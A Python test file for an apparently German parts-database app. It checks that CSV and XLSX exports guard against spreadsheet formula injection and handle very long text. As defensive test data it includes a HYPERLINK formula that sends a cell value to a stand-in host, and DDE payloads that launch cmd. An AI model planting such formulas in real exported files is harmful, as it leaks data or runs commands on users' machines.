"""Export/import safety: formula injection in CSV (INT-09) and long texts (INT-10)."""
from __future__ import annotations

import io
import time
from typing import Any

import openpyxl
from fastapi.testclient import TestClient

from partforge.importers import spreadsheet as ss

HYPERLINK = '=HYPERLINK("http://example.invalid/?x="&A2,"Datenblatt")'
DDE = "@SUM(1+1)*cmd|' /C calc'!A0"
# values from QA sec finding 3: Excel would evaluate these when opening a CSV; the round trip must be lossless
TRICKY = {"Manufacturer": "@1kHz", "Description": "=see table", "Notes": "+85C", "Package": "-40..+125"}


def _wait(client: TestClient, job_id: str) -> dict[str, Any]:
    for _ in range(300):
        job = client.get(f"/api/jobs/{job_id}").json()
        if job["status"] in ("done", "failed", "cancelled"):
            return job
        time.sleep(0.05)
    raise AssertionError("Job endet nicht")


def _make(client: TestClient, pn: str, **values: Any) -> None:
    r = client.post("/api/parts/Inductors", json={"values": {"Part Number": pn, **values}, "allow_incomplete": True})
    assert r.status_code == 201, r.text


def test_csv_export_guards_formulas_by_default(client: TestClient) -> None:
    _make(client, "CSVINJ-1", Manufacturer=HYPERLINK, Description=DDE, Notes="-2+3+cmd|' /C calc'!A0",
          **{"Operating Temperature": "-55 … 125"})
    r = client.get("/api/export/Inductors", params={"format": "csv", "columns": [
        "Part Number", "Manufacturer", "Description", "Notes", "Operating Temperature"]})
    line = r.content.decode("utf-8-sig").splitlines()[1]
    assert line.startswith("CSVINJ-1;\"'=HYPERLINK(")
    assert ";'@SUM(1+1)*cmd|' /C calc'!A0;" in line
    assert "'-2+3+cmd" in line  # a minus before an expression is guarded, too
    assert line.endswith(";-55°C … 125°C")  # a measurement stays readable
    # the folder export and the job use the same default
    saved = client.post("/api/export/Inductors", json={"format": "csv", "columns": ["Part Number", "Manufacturer"]})
    content = open(saved.json()["path"], encoding="utf-8-sig").read()  # noqa: SIM115 - test
    assert "'=HYPERLINK" in content
    job = _wait(client, client.post("/api/export/Inductors/job", json={
        "format": "csv", "columns": ["Part Number", "Description"]}).json()["job"]["id"])
    assert "'@SUM" in open(job["result"]["path"], encoding="utf-8-sig").read()  # noqa: SIM115 - test


def test_guarded_csv_imports_the_original_values(client: TestClient) -> None:
    _make(client, "CSVINJ-2", Manufacturer=HYPERLINK, Description=DDE)
    exported = client.get("/api/export/Inductors", params={"format": "csv", "columns": [
        "Part Number", "Manufacturer", "Description"]}).content
    rows = ss._read_csv  # noqa: SLF001 - the reader is the unit under test
    path = ss.upload_path(ss.store_upload(exported, "back.csv"))[0]
    data, _enc, _delim = rows(path)
    assert data[1] == ["CSVINJ-2", HYPERLINK, DDE]


def test_csv_preview_reads_very_long_fields(client: TestClient) -> None:
    long_text = "x" * 200_000
    _make(client, "LONG-1", Description=long_text)
    exported = client.get("/api/export/Inductors", params={"format": "csv"}).content
    r = client.post("/api/import/preview", files={"file": ("long.csv", exported, "text/csv")},
                    data={"table": "Inductors"})
    assert r.status_code == 200, r.text[:300]
    assert r.json()["row_count"] == 1


def test_unreadable_csv_is_a_german_400(client: TestClient) -> None:
    broken = b'Part Number;Description\nA;"never closed\n' + b"x" * 10 + b"\0"
    r = client.post("/api/import/preview", files={"file": ("broken.csv", broken, "text/csv")})
    assert r.status_code in (200, 400)  # the csv module may accept it – it must never be a 500
    if r.status_code == 400:
        assert "CSV" in r.json()["detail"]


def test_xlsx_export_reports_cut_cells_and_update_keeps_the_long_text(client: TestClient) -> None:
    long_text = "Beschreibung " + "y" * 40_000
    _make(client, "LONG-2", Description=long_text, Notes="kurz")
    r = client.get("/api/export/Inductors", params={"format": "xlsx"})
    assert r.headers.get("X-PartForge-Truncated-Cells") == "1"
    sheet = openpyxl.load_workbook(io.BytesIO(r.content)).active
    header = [c.value for c in sheet[1]]
    cell = sheet.cell(row=2, column=header.index("Description") + 1).value
    assert len(cell) == ss.XLSX_CELL_LIMIT
    job = _wait(client, client.post("/api/export/Inductors/job", json={"format": "xlsx"}).json()["job"]["id"])
    assert job["result"]["warnings"] and "gekürzt" in job["result"]["warnings"][0]
    assert "gekürzt" in job["message"]
    # re-import in mode update: the cut cell is reported and never overwrites the stored text
    prev = client.post("/api/import/preview", files={"file": ("back.xlsx", r.content, "application/octet-stream")},
                       data={"table": "Inductors"}).json()
    again = client.post(f"/api/import/preview/{prev['token']}", json={
        "table": "Inductors", "mapping": prev["mapping"], "mode": "update"}).json()
    status = again["row_status"][0]
    assert any("32.767" in w for w in status["warnings"])
    assert "Description" not in status["changed"]
    run = client.post("/api/import/run", json={"token": prev["token"], "table": "Inductors", "mapping": prev["mapping"],
                                               "mode": "update"})
    assert _wait(client, run.json()["job"]["id"])["status"] == "done"
    assert client.get("/api/parts/Inductors/LONG-2").json()["Description"] == long_text


def test_tricky_values_are_guarded_and_round_trip_losslessly(client: TestClient) -> None:
    """QA sec finding 3: every CSV export is guarded by default; reading the export strips exactly the
    guard apostrophe again, so values like '=see table', '+85C', '@1kHz', '-40..+125' survive unchanged."""
    cols = ["Part Number", *TRICKY]
    _make(client, "TRICKY-1", **TRICKY)
    exported = client.get("/api/export/Inductors", params={"format": "csv", "columns": cols}).content
    line = exported.decode("utf-8-sig").splitlines()[1]
    assert all(f"'{v}" in line for v in TRICKY.values())  # each value is guarded with a leading apostrophe
    # reading the exported CSV strips the guard again -> the original values are back
    path = ss.upload_path(ss.store_upload(exported, "back.csv"))[0]
    data, _enc, _delim = ss._read_csv(path)  # noqa: SLF001 - the reader under test
    assert data[0] == cols
    assert data[1] == ["TRICKY-1", *TRICKY.values()]
    # the unit guard/unguard is exactly inverse for these and for safe negative measurements (never guarded)
    for value in [*TRICKY.values(), "-55°C", "-40 … +125", "-100 … +350ppm/K"]:
        cell = ss._csv_cell(value, excel_safe=True)  # noqa: SLF001
        assert ss._unguard(cell if isinstance(cell, str) else value) == value  # noqa: SLF001
    assert not ss.needs_excel_guard("-55°C") and ss.needs_excel_guard("=see table")
    # a value that itself starts with the guard apostrophe + "=" gets one more, so the import strips exactly one
    assert ss._csv_cell("'=quoted", excel_safe=True) == "''=quoted"  # noqa: SLF001
    assert ss._unguard(ss._csv_cell("'=quoted", excel_safe=True)) == "'=quoted"  # noqa: SLF001
    assert ss._csv_cell("'plain", excel_safe=True) == "'plain"  # noqa: SLF001 - nothing to strip, nothing added


def test_xlsx_writes_formula_values_as_strings(client: TestClient) -> None:
    """QA sec finding 3: openpyxl turns a string starting with '=' into a formula unless the type is forced;
    the XLSX export must keep every such value a literal string, never a formula."""
    _make(client, "XLSXSTR-1", **TRICKY)
    content = client.get("/api/export/Inductors", params={
        "format": "xlsx", "columns": ["Part Number", *TRICKY]}).content
    sheet = openpyxl.load_workbook(io.BytesIO(content)).active
    header = [c.value for c in sheet[1]]
    for column, value in TRICKY.items():
        cell = sheet.cell(row=2, column=header.index(column) + 1)
        assert cell.value == value, (column, cell.value)
        assert cell.data_type != "f", f"{column} became a formula"  # 's' (string), never 'f' (formula)
